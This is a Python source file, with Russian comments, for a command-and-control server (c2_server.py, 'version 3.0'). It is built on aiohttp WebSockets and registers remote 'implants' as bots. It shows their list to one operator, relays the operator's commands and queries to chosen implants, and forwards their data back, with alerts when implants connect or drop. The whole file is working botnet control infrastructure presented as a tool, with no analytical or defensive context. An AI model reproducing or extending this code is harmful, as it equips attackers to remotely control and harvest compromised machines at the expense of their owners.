#
# --- Файл: c2_server.py (Версия 3.0 - Командир) ---
# Он больше не шлёт уведомления сам. Он приказывает это делать.
#
import asyncio, json, os
from aiohttp import web

IMPLANTS, OPERATOR = {}, None

async def send_notification_to_operator(message):
 """Отправляет оператору ПРИКАЗ отправить уведомление."""
 if OPERATOR and not OPERATOR.closed:
  try:
   await OPERATOR.send_json({'type': 'notification', 'data': message})
  except Exception as e:
   print(f"[!] Не удалось отдать приказ на уведомление: {e}")

async def broadcast_bot_list():
 if OPERATOR and not OPERATOR.closed:
  try:
   await OPERATOR.send_json({'type': 'bot_list', 'data': list(IMPLANTS.keys())})
  except Exception: pass

async def websocket_handler(request):
 global OPERATOR, IMPLANTS
 ws = web.WebSocketResponse(); await ws.prepare(request)
 client_type, client_id = None, None
 try:
  initial_msg_raw = await ws.receive(timeout=15.0)
  if initial_msg_raw.type != web.WSMsgType.TEXT:
   await ws.close(); return ws

  initial_msg = json.loads(initial_msg_raw.data)
  client_type = initial_msg.get('type')

  if client_type == 'operator':
   OPERATOR = ws
   print("[+] Оператор подключился.")
   await broadcast_bot_list()
  elif client_type == 'implant':
   client_id = initial_msg.get('id')
   IMPLANTS[client_id] = {"ws": ws}
   print(f"[+] Новый имплант онлайн: {client_id}")
   await broadcast_bot_list()
   await send_notification_to_operator(f"✅ Имплант ОНЛАЙН: {client_id}")
  else:
   await ws.close(); return ws

  async for msg in ws:
   if msg.type == web.WSMsgType.TEXT:
    if msg.data == 'ping': 
     await ws.send_str('pong'); continue
    try:
     data = json.loads(msg.data)
    except json.JSONDecodeError:
     print(f"[!] Получен мусор от {client_id or 'неизвестного'}, игнорирую.")
     continue

    if client_type == 'operator':
     # Пересылка команд от оператора импланту
     target_id = data.get('target_id')
     if data.get('type') in ['command', 'get_details', 'get_volume_state'] and target_id in IMPLANTS:
      await IMPLANTS[target_id]["ws"].send_json(data['payload'])
    elif client_type == 'implant':
     # Пересылка данных от импланта оператору
     if OPERATOR:
      data['bot_id'] = client_id
      await OPERATOR.send_json(data)

 except Exception: pass
 finally:
  if client_type == 'implant' and client_id in IMPLANTS:
   del IMPLANTS[client_id]
   print(f"[-] Имплант отключился: {client_id}")
   await broadcast_bot_list()
   await send_notification_to_operator(f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}")
  elif client_type == 'operator':
   OPERATOR = None
   print("[-] Оператор отключился.")
 return ws

async def http_handler(request):
 return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

# --- ЗАПУСК ---
app = web.Application()
app.router.add_get('/', http_handler)
app.router.add_get('/ws', websocket_handler)

if __name__ == "__main__":
 port = int(os.environ.get("PORT", 8080))
 web.run_app(app, host='0.0.0.0', port=port)
